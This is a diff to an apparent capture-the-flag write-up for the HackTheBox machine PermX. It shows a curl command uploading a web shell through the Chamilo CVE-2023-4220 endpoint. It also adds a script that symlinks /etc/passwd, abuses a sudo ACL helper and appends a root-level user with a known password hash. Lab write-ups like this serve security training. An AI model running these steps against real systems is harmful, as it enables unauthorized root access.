@@ -118,7 +118,7 @@ to execute commands
 - I uploaded the file with curl
 
       ❯ curl -F "bigUploadFile=@<shell filename>" "http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
-    The file has successfully been uploaded.%
+      The file has successfully been uploaded.%
 
 - Access your web shell at route `/main/inc/lib/javascript/bigupload/files/[filename]`
 
@@ -138,6 +138,7 @@ to execute commands
 
 ![image](https://github.com/user-attachments/assets/ad7c7cca-a266-4708-8aa3-089ef80f3711)
 
+---------------------
 
 ### PRIVESC with SETFACL
 
@@ -164,6 +165,8 @@ to execute commands
 
       /usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
 
+----------------------
+
 ### Exploiting the ACL script
 
 - We can exploit this by creating symbolic link of `/etc/passwd` in mtz's directory.After creating the symbolic link wiith write access to `/etc/passwd`,
@@ -184,6 +187,15 @@ This hash's password is `password123`.
 
 ![image](https://github.com/user-attachments/assets/93062d63-b64a-420f-9097-b24c94ce3bbb)
 
+- You can automate it with this
+
+       ln -s /etc/passwd ~/passwd
+       sudo -u root /opt/acl.sh mtz rwx /home/mtz/passwd
+       echo "sensei:\$1\$1YY732V9\$Irh.HtaGlscLmIz6SLQgM/:0:0:root:/root:/bin/bash" >> /home/mtz/passwd
+       /usr/bin/echo "enter 'password123'"
+       su sensei
+
+
 - Access to user `sensei`
 
 ![image](https://github.com/user-attachments/assets/d1769749-3965-4804-a021-3b0962f6ed38)
@@ -194,6 +206,15 @@ This hash's password is `password123`.
 
 -----------------------
 
+### THANKS FOR READING!!!!
+
+------------------------
+
+### REFERENCES:
+
+- [Chamilo](https://github.com/dollarboysushil/Chamilo-LMS-Unauthenticated-File-Upload-CVE-2023-4220)
+
+-------------------------
 
 
   
